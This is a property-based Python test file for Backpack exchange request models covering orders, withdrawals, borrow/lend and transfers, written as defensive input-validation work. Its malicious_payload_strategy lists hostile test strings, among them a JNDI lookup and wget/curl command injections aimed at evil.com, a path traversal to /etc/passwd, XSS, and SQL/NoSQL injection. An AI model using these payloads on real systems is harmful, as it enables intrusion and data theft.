"""Property-based tests for Backpack raw API request payload models.

These tests validate critical security boundary models that process external request payload data.
The models tested here are essential for trading order placement, account management, and transfer operations.

SECURITY CRITICAL: These raw models protect against:
- Malicious request payload data that could manipulate trading operations
- Financial precision errors in order prices and quantities
- Buffer overflow attacks through oversized payload values
- Injection attacks through malformed request structures
- Parameter manipulation that could affect order execution
- Authentication manipulation that could affect authorization

Property testing ensures comprehensive coverage of request payload edge cases and adversarial inputs.
"""

from decimal import Decimal
from typing import Any, Literal

import pytest
from hypothesis import given, strategies as st, assume
from hypothesis.strategies import SearchStrategy
from pydantic import ValidationError

from cyberdelta.apis.backpack.models.bp_raw_api_request_payloads import (
    BackpackRawOrderExecuteRequest,
    BackpackRawOrderCancelRequest,
    BackpackRawOrderCancelAllRequest,
    BackpackRawAccountWithdrawalRequest,
    BackpackRawUpdateAccountSettingsRequest,
    BackpackRawAccountConvertDustRequest,
    BackpackRawBorrowLendExecuteRequest,
    BackpackRawRequestForQuoteRequest,
    BackpackRawQuoteSubmitRequest,
    BackpackRawQuoteAcceptRequest,
    BackpackRawRequestForQuoteCancelRequest,
    BackpackRawRequestForQuoteRefreshRequest,
    BackpackRawInternalTransferRequest,
)
from cyberdelta.exceptions.field_validation import TypeFieldError
from cyberdelta.exceptions.parsing import EmptyStringError


# =============================================================================
# HYPOTHESIS STRATEGIES FOR REQUEST PAYLOAD MODEL TESTING
# =============================================================================


def financial_decimal_strategy() -> SearchStrategy[str]:
    """Generate decimal strings for financial amounts (prices, quantities)."""
    return st.one_of([
        # Trading amounts and prices
        st.decimals(min_value=Decimal("0"), max_value=Decimal("1000000"), places=8).map(str),
        st.decimals(min_value=Decimal("0.00000001"), max_value=Decimal("100000"), places=6).map(
            str
        ),
        # Common trading values
        st.just("0"),  # Zero amount
        st.just("0.0"),  # Zero with decimal
        st.just("100.0"),  # Standard price
        st.just("0.5"),  # Fractional BTC
        st.just("1000.123456"),  # USDC with precision
        st.just("0.00000001"),  # Minimum precision
        st.just("50000.99"),  # BTC price
        st.just("1800.50"),  # ETH price
        st.just("150.25"),  # SOL price
        # Scientific notation (valid for decimal parsing)
        st.just("1e6"),
        st.just("1.5e3"),
        st.just("2.5e-4"),
    ])


def order_type_strategy() -> SearchStrategy[str]:
    """Generate valid order type literal values."""
    return st.sampled_from(["Market", "Limit"])


def order_side_strategy() -> SearchStrategy[str]:
    """Generate valid order side literal values."""
    return st.sampled_from(["Bid", "Ask"])


def symbol_strategy() -> SearchStrategy[str]:
    """Generate valid trading symbols."""
    return st.one_of([
        # Common symbols
        st.just("BTC_USDC"),
        st.just("ETH_USDC"),
        st.just("SOL_USDC"),
        st.just("BTC_USDT"),
        st.just("ETH_USDT"),
        # Generated symbols
        st.text(
            min_size=3,
            max_size=20,
            alphabet=st.characters(
                whitelist_categories=["Lu", "Ll", "Nd"], whitelist_characters="_-"
            ),
        ).filter(lambda x: x and len(x.encode("utf-8")) <= 64),
        # Edge cases
        st.just("A_B"),  # Minimum length
        st.just("VERYLONGSYMBOL_USDC"),  # Longer symbol
    ])


def client_id_strategy() -> SearchStrategy[int]:
    """Generate valid client ID values."""
    return st.integers(min_value=1, max_value=4294967295)  # uint32 range


def blockchain_strategy() -> SearchStrategy[str]:
    """Generate valid blockchain literal values."""
    return st.sampled_from([
        "Arbitrum",
        "Base",
        "Bitcoin",
        "BitcoinCash",
        "BNBSmartChain",
        "Cardano",
        "Dogecoin",
        "Ethereum",
        "Litecoin",
        "Polygon",
        "Solana",
        "Story",
        "Sui",
        "XRP",
    ])


def asset_symbol_strategy() -> SearchStrategy[str]:
    """Generate valid asset symbol literal values."""
    return st.sampled_from([
        "BTC",
        "ETH",
        "SOL",
        "USDC",
        "USDT",
        "PYTH",
        "JTO",
        "JUP",
        "RNDR",
        "TNSR",
        "W",
        "INF",
        "MOBILE",
        "KMNO",
        "MEW",
        "DRIFT",
        "WIF",
        "CLOUD",
        "MICHI",
        "TRUMP",
        "TOLY",
        "BONK",
        "RAY",
        "WEN",
        "BODEN",
        "SAMO",
        "BOME",
        "HNT",
        "IO",
        "DJT",
        "MATIC",
        "BNB",
        "HYPE",
        "VIRTUAL",
        "AI16Z",
        "PENGU",
        "ME",
        "GRASS",
        "MOVE",
        "DOGE",
        "SUI",
        "BNSOL",
        "JITOSOL",
        "MOODENG",
        "LESTER",
    ])


def time_in_force_strategy() -> SearchStrategy[str]:
    """Generate valid time in force literal values."""
    return st.sampled_from(["GTC", "IOC", "FOK"])


def self_trade_prevention_strategy() -> SearchStrategy[str]:
    """Generate valid self trade prevention literal values."""
    return st.sampled_from(["RejectTaker", "RejectMaker", "RejectBoth"])


def trigger_by_strategy() -> SearchStrategy[str]:
    """Generate valid trigger by literal values."""
    return st.sampled_from(["LastPrice", "MarkPrice", "IndexPrice"])


def borrow_lend_side_strategy() -> SearchStrategy[str]:
    """Generate valid borrow/lend side literal values."""
    return st.sampled_from(["Borrow", "Lend", "Repay", "Redeem"])


def account_type_strategy() -> SearchStrategy[str]:
    """Generate valid account type literal values."""
    return st.sampled_from(["SPOT", "MARGIN", "FUTURES"])


def address_strategy() -> SearchStrategy[str]:
    """Generate valid address strings."""
    return st.one_of([
        # Common address patterns
        st.just("0x1234567890abcdef"),
        st.just("bc1qw508d6qejxtdg4y5r3zarvary0c5xw7kv8f3t4"),
        st.just("1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2"),
        # Generated addresses
        st.text(
            min_size=10,
            max_size=64,
            alphabet=st.characters(
                whitelist_categories=["Nd"], whitelist_characters="abcdefABCDEF"
            ),
        ).filter(lambda x: x and len(x.encode("utf-8")) <= 128),
    ])


def rfq_id_strategy() -> SearchStrategy[str]:
    """Generate valid RFQ ID strings."""
    return st.one_of([
        # Common patterns
        st.just("rfq_123"),
        st.just("quote_456"),
        st.text(
            min_size=3,
            max_size=20,
            alphabet=st.characters(
                whitelist_categories=["Lu", "Ll", "Nd"], whitelist_characters="_-"
            ),
        ).filter(lambda x: x and len(x.encode("utf-8")) <= 64),
    ])


def timestamp_strategy() -> SearchStrategy[int]:
    """Generate valid timestamp values."""
    return st.integers(min_value=1640995200000, max_value=2147483647000)  # Valid timestamp range


@st.composite
def valid_order_execute_data(draw) -> dict[str, Any]:
    """Generate valid order execute request data."""
    order_type = draw(order_type_strategy())
    base_data = {
        "orderType": order_type,
        "side": draw(order_side_strategy()),
        "symbol": draw(symbol_strategy()),
    }

    # Add required fields for limit orders
    if order_type == "Limit":
        base_data["price"] = draw(financial_decimal_strategy())
        base_data["quantity"] = draw(financial_decimal_strategy())
    else:  # Market order
        base_data["quantity"] = draw(financial_decimal_strategy())

    # Randomly add optional fields
    if draw(st.booleans()):
        base_data["clientId"] = draw(client_id_strategy())
    if draw(st.booleans()):
        base_data["postOnly"] = draw(st.booleans())
    if draw(st.booleans()):
        base_data["timeInForce"] = draw(time_in_force_strategy())

    return base_data


@st.composite
def valid_order_cancel_data(draw) -> dict[str, Any]:
    """Generate valid order cancel request data."""
    base_data = {
        "symbol": draw(symbol_strategy()),
    }

    # Add either orderId or clientId (or both)
    if draw(st.booleans()):
        base_data["orderId"] = draw(rfq_id_strategy())
    if draw(st.booleans()):
        base_data["clientId"] = draw(client_id_strategy())

    return base_data


@st.composite
def valid_withdrawal_request_data(draw) -> dict[str, Any]:
    """Generate valid withdrawal request data."""
    return {
        "address": draw(address_strategy()),
        "blockchain": draw(blockchain_strategy()),
        "quantity": draw(financial_decimal_strategy()),
        "symbol": draw(asset_symbol_strategy()),
    }


@st.composite
def valid_borrow_lend_data(draw) -> dict[str, Any]:
    """Generate valid borrow/lend request data."""
    return {
        "quantity": draw(financial_decimal_strategy()),
        "side": draw(borrow_lend_side_strategy()),
        "symbol": draw(asset_symbol_strategy()),
    }


@st.composite
def valid_rfq_request_data(draw) -> dict[str, Any]:
    """Generate valid RFQ request data."""
    base_data = {
        "symbol": draw(symbol_strategy()),
    }

    # Add either quantity or quoteQuantity (or both)
    if draw(st.booleans()):
        base_data["quantity"] = draw(financial_decimal_strategy())
    if draw(st.booleans()):
        base_data["quoteQuantity"] = draw(financial_decimal_strategy())

    return base_data


@st.composite
def valid_internal_transfer_data(draw) -> dict[str, Any]:
    """Generate valid internal transfer data."""
    from_account = draw(account_type_strategy())
    to_account = draw(account_type_strategy())

    return {
        "symbol": draw(symbol_strategy()),
        "quantity": draw(financial_decimal_strategy()),
        "fromAccount": from_account,
        "toAccount": to_account,
    }


def malicious_payload_strategy() -> SearchStrategy[Any]:
    """Generate malicious values for request payload security testing."""
    return st.one_of([
        # Financial manipulation attempts
        st.just("${jndi:ldap://evil.com/steal-orders}"),
        st.just("999999999999999999999999999999.99"),  # Overflow attempt
        st.just("../../etc/passwd"),  # Path traversal
        # XSS attempts
        st.just("<script>alert('order-xss')</script>"),
        st.just("<img src=x onerror=alert(document.cookie)>"),
        # SQL injection attempts
        st.just("'; DROP TABLE orders;--"),
        st.just("1' UNION SELECT * FROM accounts--"),
        # Buffer overflow attempts
        st.text(min_size=10000, max_size=50000),
        st.just("P" * 10000),
        # Unicode attacks
        st.just("\udce2\udc28\udc00"),  # Lone surrogates
        st.just("\x00\x01\x02"),  # Control characters
        # Format string attacks
        st.just("%s%s%s%s%n"),
        st.just("%x%x%x%x"),
        # Command injection
        st.just("; wget evil.com/backdoor"),
        st.just("`curl evil.com/exfiltrate`"),
        # NoSQL injection
        st.just("'; return db.orders.find(); //"),
        # JSON injection
        st.just('{"$where": "this.price > 100000"}'),
        # Order manipulation
        st.just("100.0'; UPDATE orders SET price=0;--"),
        # Type confusion
        st.none(),
        st.integers(),
        st.floats(),
        st.booleans(),
        st.lists(st.text()),
        st.dictionaries(st.text(), st.text()),
        st.binary(),
    ])


# =============================================================================
# PROPERTY TESTS FOR BACKPACK RAW ORDER EXECUTE REQUEST MODEL
# =============================================================================


class TestBackpackRawOrderExecuteRequestProperties:
    """Property-based tests for BackpackRawOrderExecuteRequest validation and security."""

    @given(order_data=valid_order_execute_data())
    def test_order_execute_validation_success_properties(self, order_data: dict[str, Any]) -> None:
        """Property: Valid order execute data should always create valid BackpackRawOrderExecuteRequest objects."""
        # Skip invalid decimal values
        try:
            for field in ["price", "quantity"]:
                if field in order_data:
                    decimal_val = Decimal(order_data[field])
                    assume(decimal_val.is_finite() and decimal_val >= 0)
        except (ValueError, TypeError):
            assume(False)

        # Skip empty or invalid strings
        for field in ["orderType", "side", "symbol"]:
            value = order_data[field]
            assume(isinstance(value, str) and value.strip())
            assume(len(value.encode("utf-8")) <= 64)

        obj = BackpackRawOrderExecuteRequest.model_validate(order_data)

        # Property: Object should be created successfully
        assert isinstance(obj, BackpackRawOrderExecuteRequest)

        # Property: All fields should be preserved with correct types
        assert obj.orderType == order_data["orderType"]
        assert obj.side == order_data["side"]
        assert obj.symbol == order_data["symbol"]

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "forbid"
        assert obj.model_config.get("frozen") is True
        assert obj.model_config.get("populate_by_name") is True

    @given(
        field_name=st.sampled_from([
            "orderType",
            "side",
            "symbol",
            "price",
            "quantity",
            "clientId",
        ]),
        malicious_value=malicious_payload_strategy(),
    )
    def test_order_execute_security_boundary_properties(
        self, field_name: str, malicious_value: Any
    ) -> None:
        """Property: Order execute request model should reject malicious inputs safely."""
        base_data = {
            "orderType": "Limit",
            "side": "Bid",
            "symbol": "BTC_USDC",
            "price": "50000.0",
            "quantity": "1.0",
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
            BackpackRawOrderExecuteRequest.model_validate(base_data)

    @given(
        decimal_field=st.sampled_from(["price", "quantity"]),
        decimal_value=st.one_of([
            # Valid decimals
            st.just("0"),
            st.just("100.50"),
            st.just("1e6"),
            st.just("2.5e-4"),
            # Invalid decimals
            st.just("-100.0"),  # Negative
            st.just("NaN"),
            st.just("inf"),
            st.just("-inf"),
            st.just("Infinity"),
            st.just("-Infinity"),
            st.just("1..0"),
            st.just("not_a_number"),
            st.just(""),
            st.just("   "),
        ]),
    )
    def test_order_execute_decimal_validation_properties(
        self, decimal_field: str, decimal_value: str
    ) -> None:
        """Property: Order execute decimal fields should validate properly."""
        order_data = {
            "orderType": "Limit",
            "side": "Bid",
            "symbol": "BTC_USDC",
            "price": "50000.0",
            "quantity": "1.0",
        }
        order_data[decimal_field] = decimal_value

        try:
            # Check if the value can be parsed as a finite decimal
            decimal_val = Decimal(decimal_value.strip() if decimal_value else "")
            is_finite = decimal_val.is_finite()
            is_empty = not decimal_value.strip()

            if is_finite and not is_empty:
                # Property: Valid finite decimals should be accepted
                obj = BackpackRawOrderExecuteRequest.model_validate(order_data)
                field_value = getattr(obj, decimal_field)
                assert field_value == decimal_value
            else:
                # Property: Non-finite or empty values should be rejected
                with pytest.raises((ValidationError, EmptyStringError)):
                    BackpackRawOrderExecuteRequest.model_validate(order_data)

        except (ValueError, TypeError):
            # Property: Unparseable decimal strings should be rejected
            with pytest.raises(ValidationError):
                BackpackRawOrderExecuteRequest.model_validate(order_data)

    @given(order_data=valid_order_execute_data())
    def test_order_execute_immutability_properties(self, order_data: dict[str, Any]) -> None:
        """Property: Order execute objects should be immutable after creation."""
        # Skip invalid data
        try:
            for field in ["price", "quantity"]:
                if field in order_data:
                    decimal_val = Decimal(order_data[field])
                    assume(decimal_val.is_finite() and decimal_val >= 0)
            for field in ["orderType", "side", "symbol"]:
                assume(isinstance(order_data[field], str) and order_data[field].strip())
        except (ValueError, TypeError):
            assume(False)

        obj = BackpackRawOrderExecuteRequest.model_validate(order_data)

        # Property: Fields should not be modifiable
        with pytest.raises(ValidationError, match="Instance is frozen"):
            obj.orderType = "Market"

        with pytest.raises(ValidationError, match="Instance is frozen"):
            obj.price = "60000.0"

    @given(
        order_type=order_type_strategy(),
        invalid_literal=st.text().filter(lambda x: x not in ["Market", "Limit"]),
    )
    def test_order_execute_literal_validation_properties(
        self, order_type: str, invalid_literal: str
    ) -> None:
        """Property: Order execute literal fields should validate strictly."""
        valid_data = {
            "orderType": order_type,
            "side": "Bid",
            "symbol": "BTC_USDC",
            "quantity": "1.0",
        }

        # Property: Valid literals should be accepted
        if order_type == "Limit":
            valid_data["price"] = "50000.0"

        obj = BackpackRawOrderExecuteRequest.model_validate(valid_data)
        assert obj.orderType == order_type

        # Property: Invalid literals should be rejected
        invalid_data = valid_data.copy()
        invalid_data["orderType"] = invalid_literal

        with pytest.raises(ValidationError):
            BackpackRawOrderExecuteRequest.model_validate(invalid_data)


# =============================================================================
# PROPERTY TESTS FOR BACKPACK RAW ORDER CANCEL REQUEST MODEL
# =============================================================================


class TestBackpackRawOrderCancelRequestProperties:
    """Property-based tests for BackpackRawOrderCancelRequest validation and security."""

    @given(cancel_data=valid_order_cancel_data())
    def test_order_cancel_validation_success_properties(self, cancel_data: dict[str, Any]) -> None:
        """Property: Valid order cancel data should always create valid BackpackRawOrderCancelRequest objects."""
        # Skip empty or invalid strings
        assume(isinstance(cancel_data["symbol"], str) and cancel_data["symbol"].strip())
        assume(len(cancel_data["symbol"].encode("utf-8")) <= 64)

        obj = BackpackRawOrderCancelRequest.model_validate(cancel_data)

        # Property: Object should be created successfully
        assert isinstance(obj, BackpackRawOrderCancelRequest)

        # Property: Symbol should be preserved
        assert obj.symbol == cancel_data["symbol"]

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "forbid"
        assert obj.model_config.get("frozen") is True
        assert obj.model_config.get("populate_by_name") is True

    @given(
        field_name=st.sampled_from(["symbol", "orderId", "clientId"]),
        malicious_value=malicious_payload_strategy(),
    )
    def test_order_cancel_security_boundary_properties(
        self, field_name: str, malicious_value: Any
    ) -> None:
        """Property: Order cancel request model should reject malicious inputs safely."""
        base_data = {
            "symbol": "BTC_USDC",
            "orderId": "order_123",
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
            BackpackRawOrderCancelRequest.model_validate(base_data)


# =============================================================================
# PROPERTY TESTS FOR BACKPACK RAW WITHDRAWAL REQUEST MODEL
# =============================================================================


class TestBackpackRawAccountWithdrawalRequestProperties:
    """Property-based tests for BackpackRawAccountWithdrawalRequest validation and security."""

    @given(withdrawal_data=valid_withdrawal_request_data())
    def test_withdrawal_request_validation_success_properties(
        self, withdrawal_data: dict[str, Any]
    ) -> None:
        """Property: Valid withdrawal request data should always create valid BackpackRawAccountWithdrawalRequest objects."""
        # Skip invalid decimal values
        try:
            decimal_val = Decimal(withdrawal_data["quantity"])
            assume(decimal_val.is_finite() and decimal_val >= 0)
        except (ValueError, TypeError):
            assume(False)

        # Skip empty or invalid strings
        for field in ["address", "blockchain", "symbol"]:
            value = withdrawal_data[field]
            assume(isinstance(value, str) and value.strip())
            assume(len(value.encode("utf-8")) <= 128)  # Address can be longer

        obj = BackpackRawAccountWithdrawalRequest.model_validate(withdrawal_data)

        # Property: Object should be created successfully
        assert isinstance(obj, BackpackRawAccountWithdrawalRequest)

        # Property: All fields should be preserved with correct types
        assert obj.address == withdrawal_data["address"]
        assert obj.blockchain == withdrawal_data["blockchain"]
        assert obj.quantity == withdrawal_data["quantity"]
        assert obj.symbol == withdrawal_data["symbol"]

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "forbid"
        assert obj.model_config.get("frozen") is True
        assert obj.model_config.get("populate_by_name") is True

    @given(
        field_name=st.sampled_from(["address", "blockchain", "quantity", "symbol"]),
        malicious_value=malicious_payload_strategy(),
    )
    def test_withdrawal_request_security_boundary_properties(
        self, field_name: str, malicious_value: Any
    ) -> None:
        """Property: Withdrawal request model should reject malicious inputs safely."""
        base_data = {
            "address": "0x1234567890abcdef",
            "blockchain": "Ethereum",
            "quantity": "100.0",
            "symbol": "USDC",
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
            BackpackRawAccountWithdrawalRequest.model_validate(base_data)


# =============================================================================
# PROPERTY TESTS FOR BACKPACK RAW BORROW LEND REQUEST MODEL
# =============================================================================


class TestBackpackRawBorrowLendExecuteRequestProperties:
    """Property-based tests for BackpackRawBorrowLendExecuteRequest validation and security."""

    @given(borrow_lend_data=valid_borrow_lend_data())
    def test_borrow_lend_validation_success_properties(
        self, borrow_lend_data: dict[str, Any]
    ) -> None:
        """Property: Valid borrow/lend data should always create valid BackpackRawBorrowLendExecuteRequest objects."""
        # Skip invalid decimal values
        try:
            decimal_val = Decimal(borrow_lend_data["quantity"])
            assume(decimal_val.is_finite() and decimal_val >= 0)
        except (ValueError, TypeError):
            assume(False)

        # Skip empty or invalid strings
        for field in ["side", "symbol"]:
            value = borrow_lend_data[field]
            assume(isinstance(value, str) and value.strip())

        obj = BackpackRawBorrowLendExecuteRequest.model_validate(borrow_lend_data)

        # Property: Object should be created successfully
        assert isinstance(obj, BackpackRawBorrowLendExecuteRequest)

        # Property: All fields should be preserved with correct types
        assert obj.quantity == borrow_lend_data["quantity"]
        assert obj.side == borrow_lend_data["side"]
        assert obj.symbol == borrow_lend_data["symbol"]

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "forbid"
        assert obj.model_config.get("frozen") is True
        assert obj.model_config.get("populate_by_name") is True

    @given(
        field_name=st.sampled_from(["quantity", "side", "symbol"]),
        malicious_value=malicious_payload_strategy(),
    )
    def test_borrow_lend_security_boundary_properties(
        self, field_name: str, malicious_value: Any
    ) -> None:
        """Property: Borrow/lend request model should reject malicious inputs safely."""
        base_data = {
            "quantity": "100.0",
            "side": "Borrow",
            "symbol": "USDC",
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
            BackpackRawBorrowLendExecuteRequest.model_validate(base_data)


# =============================================================================
# PROPERTY TESTS FOR BACKPACK RAW INTERNAL TRANSFER REQUEST MODEL
# =============================================================================


class TestBackpackRawInternalTransferRequestProperties:
    """Property-based tests for BackpackRawInternalTransferRequest validation and security."""

    @given(transfer_data=valid_internal_transfer_data())
    def test_internal_transfer_validation_success_properties(
        self, transfer_data: dict[str, Any]
    ) -> None:
        """Property: Valid internal transfer data should always create valid BackpackRawInternalTransferRequest objects."""
        # Skip invalid decimal values
        try:
            decimal_val = Decimal(transfer_data["quantity"])
            assume(decimal_val.is_finite() and decimal_val >= 0)
        except (ValueError, TypeError):
            assume(False)

        # Skip empty or invalid strings
        for field in ["symbol", "fromAccount", "toAccount"]:
            value = transfer_data[field]
            assume(isinstance(value, str) and value.strip())

        obj = BackpackRawInternalTransferRequest.model_validate(transfer_data)

        # Property: Object should be created successfully
        assert isinstance(obj, BackpackRawInternalTransferRequest)

        # Property: All fields should be preserved with correct types
        assert obj.symbol == transfer_data["symbol"]
        assert obj.quantity == transfer_data["quantity"]
        assert obj.fromAccount == transfer_data["fromAccount"]
        assert obj.toAccount == transfer_data["toAccount"]

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "forbid"
        assert obj.model_config.get("frozen") is True
        assert obj.model_config.get("populate_by_name") is True

    @given(
        field_name=st.sampled_from(["symbol", "quantity", "fromAccount", "toAccount"]),
        malicious_value=malicious_payload_strategy(),
    )
    def test_internal_transfer_security_boundary_properties(
        self, field_name: str, malicious_value: Any
    ) -> None:
        """Property: Internal transfer request model should reject malicious inputs safely."""
        base_data = {
            "symbol": "USDC",
            "quantity": "100.0",
            "fromAccount": "SPOT",
            "toAccount": "MARGIN",
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
            BackpackRawInternalTransferRequest.model_validate(base_data)

    @given(
        account_type=account_type_strategy(),
        invalid_literal=st.text().filter(lambda x: x not in ["SPOT", "MARGIN", "FUTURES"]),
    )
    def test_internal_transfer_account_literal_validation_properties(
        self, account_type: str, invalid_literal: str
    ) -> None:
        """Property: Internal transfer account type literals should validate strictly."""
        valid_data = {
            "symbol": "USDC",
            "quantity": "100.0",
            "fromAccount": account_type,
            "toAccount": "SPOT",
        }

        # Property: Valid account types should be accepted
        obj = BackpackRawInternalTransferRequest.model_validate(valid_data)
        assert obj.fromAccount == account_type

        # Property: Invalid account types should be rejected
        invalid_data = valid_data.copy()
        invalid_data["fromAccount"] = invalid_literal

        with pytest.raises(ValidationError):
            BackpackRawInternalTransferRequest.model_validate(invalid_data)


# =============================================================================
# INTEGRATION TESTS WITH MIXED PROPERTY SCENARIOS
# =============================================================================


class TestBackpackRawRequestPayloadIntegrationProperties:
    """Integration property tests for request payload models working together."""

    @given(
        order_data=valid_order_execute_data(),
        withdrawal_data=valid_withdrawal_request_data(),
        transfer_data=valid_internal_transfer_data(),
        borrow_data=valid_borrow_lend_data(),
    )
    def test_request_payload_models_integration_properties(
        self,
        order_data: dict[str, Any],
        withdrawal_data: dict[str, Any],
        transfer_data: dict[str, Any],
        borrow_data: dict[str, Any],
    ) -> None:
        """Property: All request payload models should work consistently together."""
        # Skip invalid data
        try:
            # Validate all decimal fields
            for data, fields in [
                (order_data, ["price", "quantity"]),
                (withdrawal_data, ["quantity"]),
                (transfer_data, ["quantity"]),
                (borrow_data, ["quantity"]),
            ]:
                for field in fields:
                    if field in data:
                        decimal_val = Decimal(data[field])
                        assume(decimal_val.is_finite() and decimal_val >= 0)

            # Validate string constraints
            for data, fields in [
                (order_data, ["orderType", "side", "symbol"]),
                (withdrawal_data, ["address", "blockchain", "symbol"]),
                (transfer_data, ["symbol", "fromAccount", "toAccount"]),
                (borrow_data, ["side", "symbol"]),
            ]:
                for field in fields:
                    assume(isinstance(data[field], str) and data[field].strip())
        except (ValueError, TypeError):
            assume(False)

        # Property: All models should be created successfully
        order_obj = BackpackRawOrderExecuteRequest.model_validate(order_data)
        withdrawal_obj = BackpackRawAccountWithdrawalRequest.model_validate(withdrawal_data)
        transfer_obj = BackpackRawInternalTransferRequest.model_validate(transfer_data)
        borrow_obj = BackpackRawBorrowLendExecuteRequest.model_validate(borrow_data)

        # Property: All objects should be properly typed
        assert isinstance(order_obj, BackpackRawOrderExecuteRequest)
        assert isinstance(withdrawal_obj, BackpackRawAccountWithdrawalRequest)
        assert isinstance(transfer_obj, BackpackRawInternalTransferRequest)
        assert isinstance(borrow_obj, BackpackRawBorrowLendExecuteRequest)

    @given(
        complete_malicious_data=st.dictionaries(
            st.sampled_from([
                "orderType",
                "side",
                "symbol",
                "price",
                "quantity",
                "clientId",
                "address",
                "blockchain",
                "fromAccount",
                "toAccount",
            ]),
            malicious_payload_strategy(),
            min_size=3,
            max_size=8,
        )
    )
    def test_request_payload_models_adversarial_input_properties(
        self, complete_malicious_data: dict[str, Any]
    ) -> None:
        """Property: All request payload models should safely handle complete adversarial input."""
        # Property: Complete adversarial input should be safely rejected by all models

        # Test BackpackRawOrderExecuteRequest
        if all(key in complete_malicious_data for key in ["orderType", "side", "symbol"]):
            with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
                BackpackRawOrderExecuteRequest.model_validate({
                    "orderType": complete_malicious_data["orderType"],
                    "side": complete_malicious_data["side"],
                    "symbol": complete_malicious_data["symbol"],
                })

        # Test BackpackRawAccountWithdrawalRequest
        if all(
            key in complete_malicious_data
            for key in ["address", "blockchain", "quantity", "symbol"]
        ):
            with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
                BackpackRawAccountWithdrawalRequest.model_validate({
                    "address": complete_malicious_data["address"],
                    "blockchain": complete_malicious_data["blockchain"],
                    "quantity": complete_malicious_data["quantity"],
                    "symbol": complete_malicious_data["symbol"],
                })

        # Test BackpackRawInternalTransferRequest
        if all(
            key in complete_malicious_data
            for key in ["symbol", "quantity", "fromAccount", "toAccount"]
        ):
            with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
                BackpackRawInternalTransferRequest.model_validate({
                    "symbol": complete_malicious_data["symbol"],
                    "quantity": complete_malicious_data["quantity"],
                    "fromAccount": complete_malicious_data["fromAccount"],
                    "toAccount": complete_malicious_data["toAccount"],
                })


# =============================================================================
# LEGACY COMPATIBILITY TESTS
# =============================================================================


def test_BackpackRawOrderExecuteRequest_real_world_example() -> None:
    """Test with real-world order execute data."""
    payload = {
        "orderType": "Limit",
        "side": "Bid",
        "symbol": "BTC_USDC",
        "price": "50000.0",
        "quantity": "1.0",
        "clientId": 12345,
        "postOnly": True,
        "timeInForce": "GTC",
    }
    obj = BackpackRawOrderExecuteRequest.model_validate(payload)
    assert obj.orderType == "Limit"
    assert obj.side == "Bid"
    assert obj.symbol == "BTC_USDC"
    assert obj.price == "50000.0"
    assert obj.quantity == "1.0"
    assert obj.clientId == 12345
    assert obj.postOnly is True
    assert obj.timeInForce == "GTC"


def test_BackpackRawOrderCancelRequest_real_world_example() -> None:
    """Test with real-world order cancel data."""
    payload = {
        "symbol": "ETH_USDC",
        "orderId": "order_123",
        "clientId": 456,
    }
    obj = BackpackRawOrderCancelRequest.model_validate(payload)
    assert obj.symbol == "ETH_USDC"
    assert obj.orderId == "order_123"
    assert obj.clientId == 456


def test_BackpackRawAccountWithdrawalRequest_real_world_example() -> None:
    """Test with real-world withdrawal request data."""
    payload = {
        "address": "0x1234567890abcdef",
        "blockchain": "Ethereum",
        "quantity": "100.0",
        "symbol": "USDC",
        "clientId": "withdrawal_123",
        "twoFactorToken": "2fa_token",
    }
    obj = BackpackRawAccountWithdrawalRequest.model_validate(payload)
    assert obj.address == "0x1234567890abcdef"
    assert obj.blockchain == "Ethereum"
    assert obj.quantity == "100.0"
    assert obj.symbol == "USDC"
    assert obj.clientId == "withdrawal_123"
    assert obj.twoFactorToken == "2fa_token"


def test_BackpackRawBorrowLendExecuteRequest_real_world_example() -> None:
    """Test with real-world borrow/lend data."""
    payload = {
        "quantity": "100.0",
        "side": "Borrow",
        "symbol": "USDC",
    }
    obj = BackpackRawBorrowLendExecuteRequest.model_validate(payload)
    assert obj.quantity == "100.0"
    assert obj.side == "Borrow"
    assert obj.symbol == "USDC"


def test_BackpackRawInternalTransferRequest_real_world_example() -> None:
    """Test with real-world internal transfer data."""
    payload = {
        "symbol": "USDC",
        "quantity": "100.0",
        "fromAccount": "SPOT",
        "toAccount": "MARGIN",
        "clientId": "transfer_123",
    }
    obj = BackpackRawInternalTransferRequest.model_validate(payload)
    assert obj.symbol == "USDC"
    assert obj.quantity == "100.0"
    assert obj.fromAccount == "SPOT"
    assert obj.toAccount == "MARGIN"
    assert obj.clientId == "transfer_123"


def test_BackpackRawOrderExecuteRequest_market_order_example() -> None:
    """Test with market order (no price required)."""
    payload = {
        "orderType": "Market",
        "side": "Ask",
        "symbol": "SOL_USDC",
        "quantity": "10.0",
    }
    obj = BackpackRawOrderExecuteRequest.model_validate(payload)
    assert obj.orderType == "Market"
    assert obj.side == "Ask"
    assert obj.symbol == "SOL_USDC"
    assert obj.quantity == "10.0"
    assert obj.price is None


def test_BackpackRawOrderExecuteRequest_complex_order_example() -> None:
    """Test with complex order with all optional fields."""
    payload = {
        "orderType": "Limit",
        "side": "Bid",
        "symbol": "ETH_USDC",
        "price": "1800.0",
        "quantity": "5.0",
        "clientId": 789,
        "postOnly": False,
        "reduceOnly": True,
        "selfTradePrevention": "RejectMaker",
        "timeInForce": "IOC",
        "triggerPrice": "1750.0",
        "stopLossTriggerPrice": "1700.0",
        "stopLossTriggerBy": "MarkPrice",
        "takeProfitTriggerPrice": "2000.0",
        "takeProfitTriggerBy": "LastPrice",
    }
    obj = BackpackRawOrderExecuteRequest.model_validate(payload)
    assert obj.reduceOnly is True
    assert obj.selfTradePrevention == "RejectMaker"
    assert obj.timeInForce == "IOC"
